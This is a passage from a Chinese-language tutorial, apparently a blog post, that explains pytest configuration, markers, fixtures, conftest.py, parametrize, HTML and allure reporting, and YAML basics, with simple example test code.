language-ini"><code class="language-ini"><span class="token selector">[pytest]</span>#命令行参数<span class="token constant">addopts</span> <span class="token attr-value"><span class="token punctuation">=</span> -vs --color=yes</span>#测试用例的路径<span class="token constant">testpaths</span> <span class="token attr-value"><span class="token punctuation">=</span> ./testcase</span>#模块名的规则<span class="token constant">python_files</span> <span class="token attr-value"><span class="token punctuation">=</span> test_*.py</span>#类名的规则<span class="token constant">python_classes</span> <span class="token attr-value"><span class="token punctuation">=</span> Test*</span>#方法名的规则<span class="token constant">python_functions</span> <span class="token attr-value"><span class="token punctuation">=</span> test</span></code></pre><p><strong>运行</strong></p><pre><code>pytest  #要在测试用例存放的目录下运行</code></pre><h3 id="分组执行-冒烟、分模块执行、分接口和Web执行"><a href="#分组执行-冒烟、分模块执行、分接口和Web执行" class="headerlink" title="分组执行(冒烟、分模块执行、分接口和Web执行)"></a>分组执行(冒烟、分模块执行、分接口和Web执行)</h3><p><strong>testcase/test_login.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pytest@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>smoke<span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hhhhh'</span><span class="token punctuation">)</span>@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>usermanager<span class="token keyword">def</span> <span class="token function">test_logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ashkdhas'</span><span class="token punctuation">)</span></code></pre><p><strong>testcase/test_action.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pytest<span class="token keyword">def</span> <span class="token function">test_action1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"asdjiaj"</span><span class="token punctuation">)</span>@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>smoke<span class="token keyword">def</span> <span class="token function">test_action2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"asdhukuash"</span><span class="token punctuation">)</span></code></pre><p><strong>pytest.ini</strong></p><pre class=" language-ini"><code class="language-ini">#加上以下语句<span class="token constant">markers</span> <span class="token attr-value"><span class="token punctuation">=</span> </span>   smoke:冒烟用例   usermanager:用户管理模块   productmanage:商品管理模块</code></pre><p><strong>执行</strong></p><pre class=" language-bash"><code class="language-bash">pytest -m <span class="token string">"smoke"</span>  <span class="token comment" spellcheck="true">#执行somke函数 test_action2()&amp;test_login()</span>pytest -m <span class="token string">"usermanager"</span> <span class="token comment" spellcheck="true">#执行usermanager函数 test_logout()</span>pytest -m <span class="token string">"smoke or usermanager"</span>  <span class="token comment" spellcheck="true">#执行以上所有</span></code></pre><h3 id="pytest执行顺序"><a href="#pytest执行顺序" class="headerlink" title="pytest执行顺序"></a>pytest执行顺序</h3><p>pytest默认从上到下执行，改变默认顺序要使用mark标记。</p><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>run<span class="token punctuation">(</span>order<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#order为执行次序</span></code></pre><h3 id="pytest跳过执行"><a href="#pytest跳过执行" class="headerlink" title="pytest跳过执行"></a>pytest跳过执行</h3><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>skip<span class="token punctuation">(</span>age<span class="token operator">&lt;</span><span class="token number">18</span><span class="token punctuation">,</span>reason<span class="token operator">=</span><span class="token string">'未成年'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#age为已经定义的变量，有条件跳过</span>@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>skip<span class="token punctuation">(</span>reason<span class="token operator">=</span><span class="token string">"未成年"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#无条件跳过</span></code></pre><p><strong>执行</strong></p><pre class=" language-bash"><code class="language-bash">pytest</code></pre><h3 id="导出html报告"><a href="#导出html报告" class="headerlink" title="导出html报告"></a>导出html报告</h3><p><strong>安装</strong></p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> pytest-html</code></pre><p><strong>pytest.ini</strong></p><p>在根目录新建一个report目录，在pytest.ini文件中加入下列语句</p><pre class=" language-ini"><code class="language-ini"><span class="token constant">addopts</span> <span class="token attr-value"><span class="token punctuation">=</span> -vs --html ./report/report.html #html存储路径</span></code></pre><h2 id="pytest实现前后置-固件、夹具"><a href="#pytest实现前后置-固件、夹具" class="headerlink" title="pytest实现前后置(固件、夹具)"></a>pytest实现前后置(固件、夹具)</h2><h3 id="前后置的作用"><a href="#前后置的作用" class="headerlink" title="前后置的作用"></a>前后置的作用</h3><p>eg. Web自动化执行用例之前，需要打开浏览器，执行后需要关闭浏览器，这些功能由前后置实现</p><p><strong>setup/setup_class/teardown/teardown_class（所有用例）</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Testcase</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#在该类所有用例之前只执行一次，在每个类执行前的初始化工作，比如创建日志对象、创建数据库链接、创建接口的请求对象</span>    <span class="token keyword">def</span> <span class="token function">setup_class</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token comment" spellcheck="true">#在每个用例之前执行一次，在执行测试用例之前初始化代码：打开浏览器，加载网页</span>    <span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span> <span class="token comment" spellcheck="true">#必须要有此方法，否则不会执行此类</span>    <span class="token comment" spellcheck="true">#在执行测试用例之后的扫尾代码：关闭浏览器</span>    <span class="token keyword">def</span> <span class="token function">teardown</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token comment" spellcheck="true">#在每个类执行后的扫尾工作，比如销毁日志、销毁数据库的连接、销毁接口的请求对象</span>    <span class="token keyword">def</span> <span class="token function">teardown_class</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span></code></pre><h3 id="pytest-fixture"><a href="#pytest-fixture" class="headerlink" title="@pytest.fixture"></a>@pytest.fixture</h3><p>使用@pytest.fixture装饰器来实现<strong>部分</strong>用例的前后置</p><ul><li><font color=orange>scope</font> 表示被@pytest.fixture标记的方法的作用域，默认作用域于function,还可作用于class/module/package/session</li><li><font color=orange>params</font>  参数化</li><li><font color=orange>autouse=True</font>  自动化执行 默认False</li><li><font color=orange>ids：</font>当使用params参数化时，给每个值设置一个变量名，意义不大</li><li><font color=orange>name:</font>  给被@pytest.fixture标记的方法取一个别名</li></ul><h4 id="部分用例前后置"><a href="#部分用例前后置" class="headerlink" title="部分用例前后置"></a>部分用例前后置</h4><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token punctuation">(</span>scope<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>params<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>autouse<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>ids<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_fixture</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#前置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"前置"</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span>    <span class="token comment" spellcheck="true">#后置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"后置"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Testcase</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#没有前后置</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#拥有前后置方法,如果设置autouse=True则失效</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">)</span></code></pre><p><strong>输出结果</strong></p><pre><code>test1前置test2后置</code></pre><h4 id="全部用例前后置"><a href="#全部用例前后置" class="headerlink" title="全部用例前后置"></a>全部用例前后置</h4><h4 id="作用于函数"><a href="#作用于函数" class="headerlink" title="作用于函数"></a>作用于函数</h4><p>在每个函数的前后执行</p><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token punctuation">(</span>scope<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>autouse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#autouse=True应用于全部</span><span class="token keyword">def</span> <span class="token function">my_fixture</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#前置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"前置"</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span>    <span class="token comment" spellcheck="true">#后置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"后置"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Testcase</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">)</span></code></pre><p><strong>输出</strong></p><pre class=" language-python"><code class="language-python">前置test1后置前置test2后置</code></pre><h4 id="作用于类"><a href="#作用于类" class="headerlink" title="作用于类"></a>作用于类</h4><p>在每个类的前后执行</p><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token punctuation">(</span>scope<span class="token operator">=</span><span class="token string">"class"</span><span class="token punctuation">,</span>autouse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#autouse=True应用于全部</span><span class="token keyword">def</span> <span class="token function">my_fixture</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#前置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"前置"</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span>    <span class="token comment" spellcheck="true">#后置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"后置"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Testcase</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">)</span></code></pre><p><strong>输出结果</strong></p><pre><code>前置test1test2后置</code></pre><h4 id="作用于模块"><a href="#作用于模块" class="headerlink" title="作用于模块"></a>作用于模块</h4><p>在模块(py文件)前后执行</p><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token punctuation">(</span>scope<span class="token operator">=</span><span class="token string">"module"</span><span class="token punctuation">,</span>autouse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><h4 id="参数化"><a href="#参数化" class="headerlink" title="参数化"></a>参数化</h4><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token punctuation">(</span>scope<span class="token operator">=</span><span class="token string">"function"</span><span class="token punctuation">,</span>params<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'测试1'</span><span class="token punctuation">,</span><span class="token string">'测试2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">my_fixture</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#前置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"前置"</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span> request<span class="token punctuation">.</span>param <span class="token comment" spellcheck="true">#固定写法 return和yield都表示返回，但是return后面不能有代码，yield返回后可以接代码</span>    <span class="token comment" spellcheck="true">#后置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"后置"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Testcase</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#传递参数</span></code></pre><p><strong>输出结果</strong></p><pre><code>test1前置test2测试1后置前置test2测试2后置</code></pre><h3 id="全局的前置应用"><a href="#全局的前置应用" class="headerlink" title="全局的前置应用"></a>全局的前置应用</h3><p>通过conftest.py和@pytest.fixture()结合使用实现<strong>全局</strong>的前置应用：</p><ul><li>项目的全局登录</li><li>模块的全局处理</li></ul><p>在测试用例文件夹(testcase)下创建一个<font color=orange>conftest.py(固定命名)</font> 文件,可在不同的py文件中使用相同的前后置(fixture)，conftest.py的内容如下</p><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token punctuation">(</span>scope<span class="token operator">=</span><span class="token string">"function"</span><span class="token punctuation">,</span>params<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'测试1'</span><span class="token punctuation">,</span><span class="token string">'测试2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">my_fixture</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#前置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"前置"</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span> request<span class="token punctuation">.</span>param <span class="token comment" spellcheck="true">#固定写法 return和yield都表示返回，但是return后面不能有代码，yield返回后可以接代码</span>    <span class="token comment" spellcheck="true">#后置方法</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"后置"</span><span class="token punctuation">)</span></code></pre><p>其他模块中使用fixture直接调用my_fixture即可</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>多个测试用例可以在与测试用例同级文件夹下创建conftest.py文件，定义不同的fixture函数，在当前测试用例中调用函数名即可</p></blockquote><p><img src="https://img.imgdb.cn/item/6071150e8322e6675c065610.png" alt=""></p><p>上图中最后一个conftest.py文件为全局文件，其余分别为product/user的前后置文件,在test_mashang.py中使用</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span>　test_login<span class="token punctuation">(</span>all_fixture<span class="token punctuation">,</span>user_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#all_fixture为全局前后置函数，必须放在user_fixture之前传入</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>all_fixture<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>user_fixture<span class="token punctuation">)</span></code></pre><h3 id="向fixtrue传参"><a href="#向fixtrue传参" class="headerlink" title="向fixtrue传参"></a>向fixtrue传参</h3><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>fixture<span class="token keyword">def</span> <span class="token function">my_fixture</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">_method</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> a<span class="token operator">*</span>b  <span class="token keyword">return</span> _method<span class="token keyword">def</span> <span class="token function">test_me</span><span class="token punctuation">(</span>my_fixture<span class="token punctuation">)</span><span class="token punctuation">:</span>  result1 <span class="token operator">=</span> my_fixture<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token keyword">assert</span> result1 <span class="token operator">==</span> <span class="token number">6</span>  result2 <span class="token operator">=</span> my_fixture<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token keyword">assert</span> result2 <span class="token operator">==</span> <span class="token number">20</span></code></pre><h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>在需要中止的测试函数中加入以下语句</p><pre class=" language-python"><code class="language-python"><span class="token keyword">assert</span> <span class="token number">1</span><span class="token operator">==</span><span class="token number">2</span> </code></pre><p>此函数在测试执行时就会失败，不进行测试</p><h2 id="allure测试报告"><a href="#allure测试报告" class="headerlink" title="allure测试报告"></a>allure测试报告</h2><blockquote><p>安装顺序不能错</p></blockquote><h3 id="1-安装插件"><a href="#1-安装插件" class="headerlink" title="1.安装插件"></a>1.安装插件</h3><p><a href="https://github.com/allure-framework/allure2/releases" target="_blank" rel="noopener">https://github.com/allure-framework/allure2/releases</a></p><p>在上面地址下载zip包并解压，并将解压包的bin文件夹设置为系统环境变量Path。cmd验证是否成功添加：</p><pre class=" language-bash"><code class="language-bash">allure --version</code></pre><h4 id="环境配置出错"><a href="#环境配置出错" class="headerlink" title="环境配置出错"></a>环境配置出错</h4><p>首先cmd要能正常运行java javac</p><ul><li>系统变量-&gt;新建-&gt;变量名JAVA_HOME，变量值xxx\jdk1.8.0_221(自己的jdk安装目录)</li><li>系统变量-&gt;新建-&gt;变量名CLASSPATH，变量名为%JAVA_HOME%\lib; (要有分号)</li><li>系统变量Path-&gt;编辑-&gt;输入 %JAVA_HOME%\bin；</li><li>系统变量Path-&gt;编辑-&gt;输入 xx\jdk1.8.0_221\bin(不能加分号)</li><li>重启cmd</li></ul><h4 id="2-在pycharm中安装"><a href="#2-在pycharm中安装" class="headerlink" title="2.在pycharm中安装"></a>2.在pycharm中安装</h4><pre><code>pip install allure-pytest</code></pre><p>在Pycharm 终端执行：</p><pre><code>allure --version</code></pre><p>正常运行则说明安装成功。</p><h3 id="2-生成json格式的临时报告"><a href="#2-生成json格式的临时报告" class="headerlink" title="2.生成json格式的临时报告"></a>2.生成json格式的临时报告</h3><p><strong>conftest.ini</strong></p><pre class=" language-ini"><code class="language-ini">#在配置文件中加入以下语句<span class="token selector">[pytest]</span><span class="token constant">addpots</span> <span class="token attr-value"><span class="token punctuation">=</span> -vs --alluredir ./temp</span></code></pre><p>运行后生成如图所示的文件夹</p><p><img src="https://img.imgdb.cn/item/6071773e8322e6675c7d54c5.png" alt=""></p><h3 id="3-使用主函数模式运行测试用例"><a href="#3-使用主函数模式运行测试用例" class="headerlink" title="3.使用主函数模式运行测试用例"></a>3.使用主函数模式运行测试用例</h3><p>在与测试用例同级的目录下创建一个test_main.py文件</p><p><strong>test_main.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pytest<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pytest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'allure generate ./temp -o ./report --clean'</span><span class="token punctuation">)</span></code></pre><p>参数解释</p><ul><li><font color=orange>allure generate</font> 固定语法</li><li><font color=orange>./temp</font> 找到json目录</li><li><font color=orange>-o ./report</font> output输出到report目录下</li><li><font color=orange>–clean</font> 清空原有的报告目录(json目录)</li></ul><h2 id="自定义allure"><a href="#自定义allure" class="headerlink" title="自定义allure"></a>自定义allure</h2><h3 id="PO设计模式"><a href="#PO设计模式" class="headerlink" title="PO设计模式"></a>PO设计模式</h3><ul><li>Page Object：页面对象化，把一个页面的测试用例、测试逻辑，封装为一个测试或测试类</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> allure@allure<span class="token punctuation">.</span>feature<span class="token punctuation">(</span><span class="token string">"项目名称"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">:</span>    @allure<span class="token punctuation">.</span>story<span class="token punctuation">(</span><span class="token string">"测试用例名称"</span><span class="token punctuation">)</span>    @allure<span class="token punctuation">.</span>description<span class="token punctuation">(</span><span class="token string">"测试用例描述"</span><span class="token punctuation">)</span>    @allure<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"账号不存在"</span><span class="token punctuation">)</span>    @allure<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test_test1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token keyword">with</span> allure<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token string">"打开页面"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            allure<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">"1161"</span><span class="token punctuation">,</span><span class="token string">"用户名"</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#打开页面的代码</span></code></pre><h2 id="pytest-mark-parametrize-数据驱动"><a href="#pytest-mark-parametrize-数据驱动" class="headerlink" title="@pytest.mark.parametrize()数据驱动"></a>@pytest.mark.parametrize()数据驱动</h2><h3 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h3><pre class=" language-python"><code class="language-python">@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>parametrize<span class="token punctuation">(</span>args_name<span class="token punctuation">,</span>args_value<span class="token punctuation">)</span></code></pre><ul><li><font color=orange>args_name</font> 参数名</li><li><font color=orange>args_value</font> 参数值（列表、元组、字典列表、字典元组），有多个用例就会执行多少次</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pytest<span class="token keyword">class</span> <span class="token class-name">TestApi</span><span class="token punctuation">:</span>    @pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>parametrize<span class="token punctuation">(</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'zby'</span><span class="token punctuation">,</span><span class="token string">'ybz'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#参数名</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span></code></pre><p><strong>输出</strong></p><pre><code>zbyybz</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pytest<span class="token keyword">class</span> <span class="token class-name">TestApi</span><span class="token punctuation">:</span>    @pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>parametrize<span class="token punctuation">(</span><span class="token string">'name,age'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'zby'</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'ybz'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#参数名</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span></code></pre><p>输出</p><pre><code>zby 16ybz 20</code></pre><h2 id="YAML文件实现接口自动化"><a href="#YAML文件实现接口自动化" class="headerlink" title="YAML文件实现接口自动化"></a>YAML文件实现接口自动化</h2><h3 id="YAML文件功能"><a href="#YAML文件功能" class="headerlink" title="YAML文件功能"></a>YAML文件功能</h3><ul><li>用于全局的配置文件 ini/yaml</li><li>用于写测试用例(一般用于写接口测试)</li></ul><h3 id="yaml简介"><a href="#yaml简介" class="headerlink" title="yaml简介"></a>yaml简介</h3><p>yaml是一种数据格式，支持注释、换行、多行字符串、裸字符串(整型，字符串)</p><h4 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h4><ul><li>区分大小写</li><li>使用缩进表示层级，不能使用tab键缩进，只能使用空格</li><li>缩进没有数量的，只要前面是对齐就行</li><li>注释符号为#</li></ul><h4 id="数据组成"><a href="#数据组成" class="headerlink" title="数据组成"></a>数据组成</h4><p>使用 <a href="https://www.bejson.com/validators/yaml_editor" target="_blank" rel="noopener">https://www.bejson.com/validators/yaml_editor</a> 进行数据格式转换</p><h4 id="Map对象"><a href="#Map对象" class="headerlink" title="Map对象"></a>Map对象</h4><p>键值对：</p><pre class=" language-yaml"><code class="language-yaml">key<span class="token punctuation">:</span>(空格)值<span class="token key atrule">user</span><span class="token punctuation">:</span>   <span class="token key atrule">name</span><span class="token punctuation">:</span> zby   <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">18</span></code></pre><p>或</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">user</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">name</span><span class="token punctuation">:</span> zby<span class="token punctuation">,</span><span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">}</span></code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre class=" language-yaml"><code class="language-yaml"> <span class="token comment" spellcheck="true">#对齐的横线就是数组</span> <span class="token punctuation">-</span>   <span class="token key atrule">user</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> zby    <span class="token punctuation">-</span> <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">18</span> <span class="token punctuation">-</span>   <span class="token key atrule">cutomser</span><span class="token punctuation">:</span>     <span class="token punctuation">-</span><span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">1</span></code></pre><p>或</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">-</span>  <span class="token key atrule">user</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token key atrule">name</span><span class="token punctuation">:</span> <span class="token string">'zby'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><h3 id="yaml与python结合使用"><a href="#yaml与python结合使用" class="headerlink" title="yaml与python结合使用"></a>yaml与python结合使用</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> pyyaml</code></pre><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><p>在测试用例文件夹下新建一个py文件</p><p><strong>yaml_util.py 读取yaml文件</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> yaml<span class="token keyword">class</span> <span class="token class-name">YamlUtil</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#传递yaml文件</span>    <span class="token keyword">def</span> <span class="token 